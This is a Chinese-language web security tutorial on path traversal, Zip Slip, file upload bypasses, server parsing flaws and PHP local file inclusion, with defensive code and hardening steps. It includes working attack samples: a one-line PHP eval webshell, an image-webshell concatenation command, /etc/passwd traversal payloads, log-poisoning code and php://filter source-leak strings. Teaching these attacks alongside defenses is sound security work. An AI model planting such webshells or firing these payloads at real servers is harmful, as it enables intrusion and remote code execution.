## 1. 路径遍历（Path Traversal）详解

### 1.1 原理

文件系统 API 的路径语义：`..` 向上层目录。用户输入的文件名直接进入路径拼接时：

```python
# 有漏洞的下载接口：GET /download?name=report.pdf
path = os.path.join("/var/app/uploads/", request.args["name"])
# name=../../etc/passwd → os.path.join 得 /var/app/uploads/../../etc/passwd → 归一化后 /etc/passwd
open(path).read()
```

### 1.2 变体与绕过（攻防对照）

| 防御尝试 | 绕过 |
|---|---|
| 过滤字符串 `../` | 绝对路径 `/etc/passwd`（拼接时绝对路径覆盖前缀） |
| 只过滤一次 | `....//`（删掉中间 `../` 后重组出 `../`） |
| URL 解码一次后过滤 | 双重编码 `%2e%2e%2f` → 解码一次得 `..%2f` → 二次解码 `../`（框架/服务器多层解码时） |
| 校验后缀 | 遍历目录列表（读 `.` 或利用通配/空） |
| 前缀校验 startswith("/app/uploads/") | `/app/uploads/../../../etc/passwd` 依然以合法前缀开头 |
| Windows | 反斜杠 `..\`、`..%5c`、盘符绝对路径、`::%24DATA`（ADS 流）、8.3 短文件名 |

### 1.3 Zip Slip（解压路径穿越）

上传 zip 后服务端解压，若 zip 内文件名为 `../../../app/main.py`，解压库不校验就会把文件写到任意目录。历史上 Java/Go/Python/Node 的主流解压库都出过 CVE。防御：解压每个 entry 前校验 `os.path.realpath(dest).startswith(target_dir)`。

### 1.4 防御实现

```python
import os

SAFE_DIR = "/var/app/uploads"

def safe_path(name: str) -> str:
    base = os.path.realpath(SAFE_DIR)
    # realpath 归一化全部 ../ 与符号链接，再验证仍在目录内
    full = os.path.realpath(os.path.join(base, name))
    if os.path.commonpath([full, base]) != base:
        raise ValueError("path traversal")
    return full
```
更彻底：**不接受文件名，只接受 ID**（`GET /download?id=1024`，服务端查库映射到文件），用户输入根本不进路径。

## 2. 文件上传漏洞详解

### 2.1 危害成立的两个条件

① 攻击者能控制文件**内容**；② 文件能被**当作代码解析执行**（或覆盖配置/敏感文件）。防御就是同时拆掉这两个条件。

### 2.2 校验绕过矩阵（upload-labs 全 20 关的知识骨架）

| 服务端校验方式 | 绕过手法 |
|---|---|
| 扩展名黑名单 | 同义扩展名：`.php3 .php5 .phtml .pht`（Apache mime 映射）、`.jsp` → `.jspx`；大小写 `.PhP`；尾随空格/点（Windows 文件系统特性 `shell.php.` `shell.php `）；`::$DATA`（NTFS）；`.htaccess` 上传（内容 `AddType application/x-httpd-php .png`，使 png 按 PHP 执行）；`.user.ini`（`auto_prepend_file=shell.png`，PHP CGI/FastCGI） |
| 扩展名白名单 | 内容为 PHP 的图片 + 配置文件配合（`.htaccess`/`.user.ini`）；解析漏洞（见 2.3）；`shell.php%00.jpg` 截断（老版本 PHP <5.3.4） |
| MIME 校验（Content-Type） | Burp 抓包直接改 `Content-Type: image/jpeg`（请求头客户端可控） |
| 文件头（magic bytes）校验 | 图片/脚本 polyglot：`GIF89a<?php ... ?>`（GIF 头两义性）、真实图片 + 注释区写 PHP（JPEG 注释段、PNG ancillary chunk） |
| 二次渲染（resize 重编码） | 竞争条件：上传后、渲染删除前的窗口访问；或利用渲染保留的 EXIF/注释数据（图片处理库差异） |
| 随机重命名 | 不可预测时靠响应泄露路径/报错回显/目录爆破；配合解析漏洞不需要知道确切名 |
| 前端 JS 校验 | 纯摆设：抓包直发 |
| 00 截断 | 旧版 Java/PHP 文件名处理 `%00` 截断后缀判断（历史漏洞，现代语言已修，面试需知） |

### 2.3 解析漏洞（Web 服务器把静态文件当代码执行的历史洞）

| 服务器 | 漏洞 | 触发 |
|---|---|---|
| Apache | 多后缀解析：`shell.php.xxx` 从右往左找认识的扩展名，不认识 `.xxx` 则按 `.php` 执行 | 配置 `AddHandler php` 的旧版本 |
| Nginx + php-fpm | 路径信息漏洞：`/uploads/shell.png/xxx.php` 中 PATH_INFO 交给 fpm 执行 | `cgi.fix_pathinfo=1` 的错误配置 |
| IIS 6.0 | 目录解析 `/shell.asp/1.jpg`、分号截断 `shell.asp;.jpg` | 历史大洞，老系统仍存在 |
| Nginx | `alias` 配置错误：`location /files { alias /uploads/; }` 少斜杠 → `/files../etc/passwd` | 配置审计点 |

### 2.4 教学样本：最小 WebShell（仅限靶场）

```php
<!-- shell.php：一句话木马，密码 pass。中国 Web 安全教学的经典样本 -->
<?php @eval($_POST['pass']); ?>
```
为什么这一行就致命：`eval` 把 POST 参数当 PHP 代码执行，攻击者用蚁剑/冰蝎（WebShell 管理器）连接后获得完整文件管理/命令执行界面。

图片马（配合解析漏洞或包含漏洞）：

```
copy /b normal.jpg + shell.php shell.jpg   (Windows 命令拼接：合法图片头 + PHP 尾)
```

**防御者视角**：检测特征（静态：危险函数序列 `eval(`+`$_POST`；动态：文件包含网络函数 `fsockopen`、`curl_exec`）；上传目录隔离执行（下详）是根治手段。

### 2.5 竞争条件上传（Race Condition on Upload）

流程：服务端先保存原始文件 → 校验 → 不合格则删除。攻击者高频并发上传+访问：

```mermaid
flowchart LR
    a["攻击者循环：上传 evil.php"] --> b["立刻请求 /uploads/evil.php"]
    b -->|"未命中窗口，继续循环"| a
    b -->|"命中「已保存」与「删除」窗口"| c["PHP 在执行中重建自己（payload 写新文件）"]
```
防御：上传先写临时目录（Web 不可达）→ 校验通过才原子 move 到对外目录；校验不通过直接丢弃，无删除窗口。

### 2.6 防御完整方案（缺一不可）

1. **存储隔离（根治执行条件）**：
   - 上传文件放对象存储（S3/OSS）或独立静态域（CDN 域），与业务容器物理分离；
   - 必须同机时：上传目录禁执行——Nginx：`location /uploads/ { location ~ \.php$ { deny all; } }`，PHP-FPM 不监听该路径；Apache：`php_admin_flag engine off`。
2. **校验链**：扩展名白名单（按业务：jpg/png/pdf…）→ 文件头校验 → 图片类用库重新编码（杀 polyglot 与隐写数据）→ 病毒扫描（ClamAV）→ 大小/频率限制。
3. **重命名**：`uuid4 + 白名单扩展名`，文件名永不进入文件系统路径。
4. **响应头**：上传域强制 `Content-Disposition: attachment` 或 `X-Content-Type-Options: nosniff`（防把用户上传 HTML 当同源页面渲染→存储型 XSS）。
5. **配置文件审计**：禁用 `.htaccess`（`AllowOverride None`）、检查 `cgi.fix_pathinfo=0`、IIS 老版本专项。

## 3. 本地文件包含（LFI, Local File Inclusion）详解

### 3.1 原理（PHP 场景最典型）

```php
// 有漏洞：page 参数直接包含文件
include($_GET['page']);   // ?page=../../etc/passwd → 读取（包含即执行输出）
```
与路径遍历的关系：LFI 是**包含**（文件被当代码执行/输出），路径遍历是**读取**。LFI 危害更大：包含的文件里若有代码即执行。

### 3.2 利用升级：从读文件到 RCE

```
① 包含日志（log poisoning）：
   往 User-Agent / 路径写入 <?php system($_GET['c']); ?>
   → ?page=/var/log/apache2/access.log&c=id     （日志被当 PHP 执行）
   前提：知道日志路径、Web 用户可读

② 包含会话文件：session 文件路径可预测（/tmp/sess_<PHPSESSID>），
   若 session 中存了用户可控字段（如用户名）→ 注入

③ /proc 相关：/proc/self/environ（老系统）等

④ php://filter 配合（CTF 高频——读源码而非执行）：
   ?page=php://filter/convert.base64-encode/resource=index.php
   → 以 Base64 回显源码（绕过「执行 index.php」的语义），用于白盒找更多洞

⑤ php://filter chain RCE（2021 年公开的技术）：
   利用 iconv 过滤器在报错信息中逐比特泄露/构造，无需可写目录即可 RCE——
   说明「包含原语」在 PHP 里强大到什么程度

⑥ phar:// 反序列化：包含 phar 包触发元数据反序列化 → 连接反序列化 gadget（见 09 篇）

⑦ 文件上传组合：上传图片马 + LFI 包含（绕过「上传目录不可执行」的限制——
   因为是 LFI 端点在执行，不是上传目录）
```

### 3.3 防御

1. 白名单映射：`page` 只接受 `about|help|home` 枚举 → 模板路径字典，杜绝路径输入。
2. `include` 类 API 永远不接用户输入；用模板引擎（Jinja2/Thymeleaf）而非原生包含。
3. PHP 配置加固：`open_basedir`（限定可访问目录树）、`allow_url_include=Off`（防 RFI 远程包含）。
4. 日志与会话文件权限隔离（Web 用户不可读日志原文）。

## 4. 真实案例

- **ASP.NET / JSP 生态的历史解析漏洞**：大量政企老站仍受 IIS 6 解析漏洞影响（FOFA/Shodan 上至今可观测到痕迹——仅作为防御方资产巡检视角）。
- **Animo / 各类图片处理服务**：ImageMagick 历史漏洞（ImageTragick CVE-2016-3714，SVG/PSD 触及命令执行）——图片解析器本身也是攻击面，防御上应换纯解码重编码路径并禁用危险 delegate。
- **Discuz / 各 CMS 上传漏洞系列**：黑名单 + `.htaccess` 组合的历史漏洞群，是 upload-labs 关卡的来源。

## 5. 常见误区

- ❌「白名单扩展名就万事大吉」→ 解析漏洞、`.htaccess` 配合、polyglot 仍可突破；必须叠加「存储隔离禁执行」。
- ❌「MIME 校验是安全措施」→ MIME 是请求头，客户端完全可控。
- ❌「文件重命名成随机 UUID 就无法利用」→ 解析漏洞不需要执行上传目录（LFI 组合）、覆盖系统文件（Zip Slip）不受影响。
- ❌「图片重编码太耗性能就省掉」→ 重编码是杀 polyglot/隐写 payload 的关键步，性能应靠异步队列解决而非跳过。
- ❌「上传目录放在 Web 根目录下方便」→ 方便的代价是执行条件成立。
